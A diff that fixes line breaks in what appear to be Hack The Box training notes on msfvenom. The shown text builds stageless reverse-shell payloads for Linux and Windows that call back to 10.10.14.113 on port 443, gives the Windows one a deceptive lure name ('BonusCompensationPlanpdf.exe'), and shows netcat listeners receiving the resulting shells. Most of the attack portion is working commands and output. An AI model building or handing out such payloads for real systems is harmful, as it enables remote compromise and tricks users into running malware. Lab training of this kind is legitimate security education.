@@ -26,7 +26,9 @@ In Pwnbox or any host with MSFvenom installed, we can issue the command `msfven
 ### **List Payloads**
 
 ```
-th1nyunb0y@htb[/htb]$ msfvenom -l payloadsFramework Payloads (592 total) [--payload <value>]
+th1nyunb0y@htb[/htb]$ msfvenom -l payloads
+
+Framework Payloads (592 total) [--payload <value>]
 ==================================================
 
     Name                                                Description
@@ -75,7 +77,9 @@ Now let's build a simple stageless payload with msfvenom and break down the comm
 ### **Build It**
 
 ```
-th1nyunb0y@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+th1nyunb0y@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
+
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 [-] No arch selected, selecting arch: x64 from the payload
 No encoder specified, outputting raw payload
 Payload size: 74 bytes
@@ -164,7 +168,9 @@ When the file is executed, we see that we have caught a shell.
 ### **Connection Established**
 
 ```
-th1nyunb0y@htb[/htb]$ sudo nc -lvnp 443Listening on 0.0.0.0 443
+th1nyunb0y@htb[/htb]$ sudo nc -lvnp 443
+
+Listening on 0.0.0.0 443
 Connection received on 10.129.138.85 60892
 env
 PWD=/home/htb-student/Downloads
@@ -191,7 +197,9 @@ We can also use msfvenom to craft an executable (`.exe`) file that can be run on
 ### **Windows Payload**
 
 ```
-th1nyunb0y@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+th1nyunb0y@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 No encoder specified, outputting raw payload
 Payload size: 324 bytes
@@ -212,7 +220,9 @@ This is another situation where we need to be creative in getting this payload d
 If the AV was disabled all the user would need to do is double click on the file to execute and we would have a shell session.
 
 ```
-th1nyunb0y@htb[/htb]$ sudo nc -lvnp 443Listening on 0.0.0.0 443
+th1nyunb0y@htb[/htb]$ sudo nc -lvnp 443
+
+Listening on 0.0.0.0 443
 Connection received on 10.129.144.5 49679
 Microsoft Windows [Version 10.0.18362.1256]
 (c) 2019 Microsoft Corporation. All rights reserved.
